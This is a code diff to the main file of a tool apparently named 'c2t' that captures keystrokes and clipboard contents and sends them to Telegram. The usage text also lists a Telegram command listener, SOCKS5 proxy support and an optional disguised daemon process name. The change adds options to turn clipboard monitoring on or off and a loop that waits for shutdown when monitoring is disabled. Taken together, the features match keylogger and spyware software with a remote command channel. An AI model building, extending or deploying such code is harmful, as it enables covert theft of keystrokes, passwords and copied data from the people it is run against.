@@ -32,6 +32,8 @@
 
 #ifndef _WIN32
 #include <signal.h>
+#include <poll.h>
+#include <unistd.h>
 #if defined(__linux__) && defined(__GLIBC__)
 #include <malloc.h>
 #endif
@@ -78,6 +80,8 @@ static void print_usage(FILE *stream)
         "  --send-keyboard        Enable keyboard monitoring\n"
         "  --no-keyboard          Disable keyboard monitoring\n"
         "  --keyboard-flush <ms>  Inactivity delay before sending keystrokes (500-60000 ms)\n"
+        "  --send-clipboard       Enable clipboard monitoring\n"
+        "  --no-clipboard         Disable clipboard monitoring\n"
         "  --proxy <url>          Use HTTP/HTTPS/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)\n"
 #ifdef C2T_ENABLE_PROCESS_MASQUERADE
         "  --daemon-name <name>   Set custom daemon process name (default: c2t)\n"
@@ -202,6 +206,8 @@ static void print_usage(FILE *stream)
     c2t_log_info("config", "Periodic Telegram log sending=%s, interval=%llu s",
                  c2t_config_get()->telegram_send_logs ? "enabled" : "disabled",
                  (unsigned long long)c2t_config_get()->telegram_log_interval_sec);
+    c2t_log_info("config", "Clipboard monitoring=%s",
+                 c2t_config_get()->disable_clipboard ? "disabled" : "enabled");
     c2t_log_info("config", "Keyboard monitoring=%s, inactivity flush=%llu ms",
                  c2t_config_get()->disable_keyboard ? "disabled" : "enabled",
                  (unsigned long long)c2t_config_get()->keyboard_flush_ms);
@@ -221,7 +227,7 @@ static void print_usage(FILE *stream)
         if (!is_worker) c2t_runtime_release();
         return 1;
     }
-    if (!clipboard_output_init()) {
+    if (!c2t_config_get()->disable_clipboard && !clipboard_output_init()) {
         c2t_log_error("main", "Clipboard delivery worker initialization failed");
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
@@ -229,7 +235,7 @@ static void print_usage(FILE *stream)
     }
     if (!c2t_config_get()->disable_keyboard && !keyboard_output_init()) {
         c2t_log_error("main", "Keyboard delivery worker initialization failed");
-        clipboard_output_cleanup();
+        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
         return 1;
@@ -237,7 +243,7 @@ static void print_usage(FILE *stream)
     if (!c2t_log_sender_init()) {
         c2t_log_error("main", "Log sender initialization failed");
         if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
-        clipboard_output_cleanup();
+        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
         return 1;
@@ -246,7 +252,7 @@ static void print_usage(FILE *stream)
         c2t_log_error("main", "Telegram command listener initialization failed");
         c2t_log_sender_cleanup();
         if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
-        clipboard_output_cleanup();
+        if (!c2t_config_get()->disable_clipboard) clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
         return 1;
@@ -259,9 +265,28 @@ static void print_usage(FILE *stream)
 
     if (!is_worker)
         c2t_runtime_mark_running();
-    c2t_log_info("main", "Starting clipboard listener");
-    int result = clipboard_listen();
-    c2t_log_info("main", "Clipboard listener stopped with result %d", result);
+    int result = 0;
+    if (!c2t_config_get()->disable_clipboard) {
+        c2t_log_info("main", "Starting clipboard listener");
+        result = clipboard_listen();
+        c2t_log_info("main", "Clipboard listener stopped with result %d", result);
+    } else {
+        c2t_log_info("main", "Clipboard listener disabled by configuration; waiting for runtime termination");
+        int stop_fd = c2t_runtime_stop_descriptor();
+        while (!c2t_runtime_stop_requested()) {
+#ifndef _WIN32
+            if (stop_fd >= 0) {
+                struct pollfd pfd = { .fd = stop_fd, .events = POLLIN, .revents = 0 };
+                (void)poll(&pfd, 1, 500);
+            } else {
+                usleep(100000);
+            }
+#else
+            (void)stop_fd;
+            Sleep(100);
+#endif
+        }
+    }
     if (!c2t_config_get()->disable_keyboard) {
         keyboard_listener_cleanup();
     }
@@ -270,7 +295,9 @@ static void print_usage(FILE *stream)
     if (!c2t_config_get()->disable_keyboard) {
         keyboard_output_cleanup();
     }
-    clipboard_output_cleanup();
+    if (!c2t_config_get()->disable_clipboard) {
+        clipboard_output_cleanup();
+    }
     telegram_cleanup();
     c2t_log_info("main", "Shutdown complete");
     c2t_log_cleanup();
